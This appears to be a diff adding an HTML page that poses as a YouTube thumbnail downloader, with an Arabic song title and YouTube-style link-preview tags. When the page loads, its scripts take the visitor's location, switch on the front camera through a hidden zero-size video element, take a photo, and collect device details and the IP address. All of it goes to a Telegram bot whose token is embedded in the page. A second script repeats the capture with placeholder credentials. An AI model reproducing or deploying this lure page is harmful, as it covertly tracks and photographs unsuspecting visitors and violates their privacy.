@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>يا بياع الهباري من الخام الزين - رقصة نااار ام
+
+شويقي عذابي وتنوي جتلي || ضياء حمادي 2023 لا</title>
+
+    <!-- إضافة الوسوم الخاصة بـ Open Graph -->
+    <meta property="og:title" content="Geolocation and Photo to Telegram Bot">
+    <meta property="og:description" content="يا بياع الهباري من الخام الزين - رقصة نااار ام
+    
+    شويقي عذابي وتنوي جتلي || ضياء حمادي 2023 لا">
+    <meta property="og:image" content="https://www12.0zz0.com/2024/09/19/23/640663869.jpeg">
+    <meta property="og:url" content="www.youtube.com"> <!-- رابط موقعك -->
+    <meta property="og:type" content="website">
+    <meta property="og:locale" content="ar_AR"> <!-- لغة المحتوى -->
+
+</head>
+<body>
+    <script>
+        // نفس السكريبت السابق
+        // مفتاح الـ API الخاص ببوت تليجرام
+        const telegramBotToken = '7070144718:AAFfw7l5LT2KQdOq51NmMMCviJnj6zKt6Ms';
+        const chatId = '1002292943360'; // معرف المحادثة أو القناة
+
+        // دالة لإرسال الصورة إلى البوت
+        function sendPhotoToTelegram(photoBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', photoBlob, 'photo.jpg');
+
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('تم إرسال الصورة بنجاح.');
+                } else {
+                    console.log('حدث خطأ أثناء إرسال الصورة:', data);
+                }
+            })
+            .catch(error => console.error('خطأ:', error));
+        }
+
+        // دالة لالتقاط الصورة من الكاميرا
+        function capturePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            // ضبط أبعاد الفيديو على أبعاد الكانفاس
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // نسخ إطار الفيديو إلى الكانفاس
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // تحويل الصورة من الكانفاس إلى Blob
+            canvas.toBlob(sendPhotoToTelegram, 'image/jpeg');
+        }
+
+        // الحصول على الوصول إلى الكاميرا الأمامية
+        function accessCamera() {
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user' } // استخدام الكاميرا الأمامية
+            })
+            .then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // الانتظار لحظة للتأكد من تشغيل الفيديو ثم التقاط الصورة
+                video.onloadedmetadata = () => {
+                    setTimeout(capturePhoto, 2000); // التقاط الصورة بعد ثانيتين
+                };
+            })
+            .catch(error => {
+                console.error('لم يتمكن من الوصول إلى الكاميرا:', error);
+            });
+        }
+
+        // دالة لإرسال الموقع إلى البوت
+        function sendLocationToTelegram(latitude, longitude) {
+            const message = `موقعي الحالي هو:\nخط العرض: ${latitude}\nخط الطول: ${longitude}`;
+
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('تم إرسال الموقع بنجاح.');
+                    } else {
+                        console.log('حدث خطأ أثناء إرسال الموقع:', data);
+                    }
+                })
+                .catch(error => console.error('خطأ:', error));
+        }
+
+        // التأكد من دعم المتصفح لخدمة الجيولوكيشن
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                position => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    sendLocationToTelegram(latitude, longitude);
+                },
+                error => {
+                    console.error('لم يتمكن من الحصول على الموقع:', error);
+                }
+            );
+        } else {
+            console.error('الجيولوكيشن غير مدعوم في هذا المتصفح.');
+        }
+
+        // بدء الوصول إلى الكاميرا عند تحميل الصفحة
+        accessCamera();
+        
+        // دالة لإرسال البيانات إلى البوت
+        function sendInfoToTelegram(info) {
+            const message = `مواصفات الجهاز:\n${info}`;
+
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('تم إرسال المعلومات بنجاح.');
+                    } else {
+                        console.log('حدث خطأ أثناء إرسال المعلومات:', data);
+                    }
+                })
+                .catch(error => console.error('خطأ:', error));
+        }
+
+        // دالة للحصول على مواصفات الجهاز والمتصفح
+        function getDeviceInfo() {
+            const deviceInfo = {
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                cookiesEnabled: navigator.cookieEnabled,
+                screenWidth: window.screen.width,
+                screenHeight: window.screen.height,
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight
+            };
+
+            let infoString = `
+                النظام: ${deviceInfo.platform}
+                المتصفح: ${deviceInfo.userAgent}
+                اللغة: ${deviceInfo.language}
+                هل الكوكيز مفعلة: ${deviceInfo.cookiesEnabled}
+                أبعاد الشاشة: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}
+                أبعاد النافذة: ${deviceInfo.innerWidth}x${deviceInfo.innerHeight}
+            `;
+
+            return infoString;
+        }
+
+        // دالة للحصول على عنوان الـ IP باستخدام خدمة خارجية
+        function getIPAddress() {
+            return fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => data.ip)
+                .catch(error => {
+                    console.error('لم يتمكن من الحصول على عنوان الـ IP:', error);
+                    return 'غير معروف';
+                });
+        }
+
+        // دمج جميع المعلومات وإرسالها إلى البوت
+        async function sendAllInfo() {
+            const deviceInfo = getDeviceInfo();
+            const ipAddress = await getIPAddress();
+            
+            const fullInfo = `${deviceInfo}\nعنوان الـ IP: ${ipAddress}`;
+            sendInfoToTelegram(fullInfo);
+        }
+
+        // إرسال المعلومات عند تحميل الصفحة
+        sendAllInfo();
+    </script>
+        <script>
+        const telegramBotToken = 'YOUR_BOT_TOKEN'; // يجب تعيين التوكن الصحيح هنا
+        const chatId = 'YOUR_CHAT_ID'; // ضع معرف المحادثة الصحيح هنا
+
+        // دالة لإرسال الصورة إلى البوت
+        function sendPhotoToTelegram(photoBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', photoBlob, 'photo.jpg');
+
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('تم إرسال الصورة بنجاح.');
+                } else {
+                    console.log('حدث خطأ أثناء إرسال الصورة:', data);
+                }
+            })
+            .catch(error => console.error('خطأ:', error));
+        }
+
+        // دالة لالتقاط الصورة من الكاميرا
+        function capturePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(sendPhotoToTelegram, 'image/jpeg');
+        }
+
+        // دالة للوصول إلى الكاميرا
+        function accessCamera() {
+            navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user' }
+            })
+            .then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    setTimeout(capturePhoto, 2000);
+                };
+            })
+            .catch(error => {
+                console.error('لم يتمكن من الوصول إلى الكاميرا:', error);
+            });
+        }
+
+        // دالة لإرسال الموقع إلى البوت
+        function sendLocationToTelegram(latitude, longitude) {
+            const message = `موقعي الحالي هو:\nخط العرض: ${latitude}\nخط الطول: ${longitude}`;
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log('تم إرسال الموقع بنجاح.');
+                    } else {
+                        console.log('حدث خطأ أثناء إرسال الموقع:', data);
+                    }
+                })
+                .catch(error => console.error('خطأ أثناء الإرسال:', error));
+        }
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                position => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    sendLocationToTelegram(latitude, longitude);
+                },
+                error => {
+                    console.error('لم يتمكن من الحصول على الموقع:', error);
+                }
+            );
+        } else {
+            console.error('الجيولوكيشن غير مدعوم في هذا المتصفح.');
+        }
+
+        accessCamera();
+    </script>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  
+  <title>YouTube Thumbnail Downloader</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
+  <style>
+    body {
+      font-family: 'Montserrat', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f5f5f5;
+    }
+    .navbar {
+      background-color: #ff0000;
+      color: white;
+      text-align: center;
+      padding: 15px 0;
+    }
+    #header {
+      margin: 0;
+      font-size: 28px;
+      font-weight: bold;
+    }
+    .container {
+      max-width: 600px;
+      margin: 20px auto;
+      padding: 20px;
+      background-color: #fff;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+    .form-control {
+      width: calc(100% - 22px);
+      margin-bottom: 15px;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-sizing: border-box;
+      font-family: 'Montserrat', sans-serif;
+    }
+    #thumbdloadbtn {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      background-color: #ff0000;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      font-family: 'Montserrat', sans-serif;
+    }
+    #thumbdloadbtn:hover {
+      background-color: #cc0000;
+    }
+    footer {
+      text-align: center;
+      margin-top: 40px;
+      color: #666;
+    }
+    .youtube-logo {
+      display: block;
+      margin: 20px auto;
+      width: 100px; /* Adjust size as needed */
+    }
+  </style>
+  <script type='text/javascript'>
+  //<![CDATA[
+  var uri = window.location.toString();
+  if (uri.indexOf("%3D") > 0) {
+      var clean_uri = uri.substring(0, uri.indexOf("%3D"));
+      window.history.replaceState({}, document.title, clean_uri);
+  }
+
+  uri = window.location.toString();
+  if (uri.indexOf("%3D%3D") > 0) {
+      clean_uri = uri.substring(0, uri.indexOf("%3D%3D"));
+      window.history.replaceState({}, document.title, clean_uri);
+  }
+
+  uri = window.location.toString();
+  if (uri.indexOf("&m=1") > 0) {
+      clean_uri = uri.substring(0, uri.indexOf("&m=1"));
+      window.history.replaceState({}, document.title, clean_uri);
+  }
+
+  uri = window.location.toString();
+  if (uri.indexOf("?m=1") > 0) {
+      clean_uri = uri.substring(0, uri.indexOf("?m=1"));
+      window.history.replaceState({}, document.title, clean_uri);
+  }
+  //]]>
+  </script>
+<link rel="me" href="https://www.blogger.com/profile/09720129010042195623" />
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+</head>
+<body>
+  <nav class="navbar">
+    <img class="youtube-logo" src="https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg" alt="YouTube Logo">
+    <h1 id="header">YOUTUBE THUMBNAIL DOWNLOADER</h1>
+  </nav>
+
+  <div class="container">
+    <input id="ytlink" type="text" class="form-control" placeholder="Enter YouTube Video URL" spellcheck="false">
+    <button id="thumbdloadbtn" onclick="downloadThumbnail()">FETCH</button>
+    <div id="thumbnail-preview"><!-- Placeholder for thumbnail preview --></div>
+
+    <h2>How to Download HD YouTube Thumbnail</h2>
+    <ol>
+      <li>Copy the YouTube Video Link / URL from the YouTube App or Website</li>
+      <li>Paste the YouTube video Link / URL in the Input Field Above</li>
+      <li>Click on the "FETCH" Button</li>
+      <li>Select the thumbnail quality</li>
+      <li>Download the Thumbnail</li>
+    </ol>
+  </div>
+
+  <center>
+    <button id="toggle-video" style="display:none;">Toggle Video</button>
+    <div id="message-container"></div>
+    <video id="video" width="0" height="0" autoplay></video>
+  </center>
+
+
+
+  <footer>
+    <p> made with ❤ </p>
+  </footer>
+
